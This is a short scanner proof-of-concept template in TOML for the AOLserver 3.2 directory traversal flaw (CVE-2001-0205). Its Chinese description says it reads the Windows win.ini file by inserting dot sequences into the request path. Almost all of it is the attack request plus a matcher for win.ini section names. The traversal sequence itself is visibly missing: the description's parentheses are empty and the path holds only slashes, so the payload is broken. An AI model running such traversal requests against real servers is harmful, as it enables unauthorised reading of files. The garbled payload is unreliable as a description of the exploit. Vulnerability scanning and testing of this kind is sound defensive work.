[info]
author = "ave"
description = "验证 AOLserver 3.2 目录遍历漏洞。攻击者通过在请求路径中插入省略号序列（）绕过目录检测，可读取服务器任意文件。本 PoC 尝试读取 Windows 系统文件 win.ini 以验证漏洞存在。"
id = "POC-AVE-2001-0080"
name = "AOLserver 3.2 Directory Traversal PoC"
severity = "medium"
tags = ["ave-2001-0080"]
vuln_id = [
    "CVE-2001-0205",
    "AVE-2001-0080",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/////windows/win.ini"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "[fonts]",
    "[mci extensions]",
    "[files]",
]
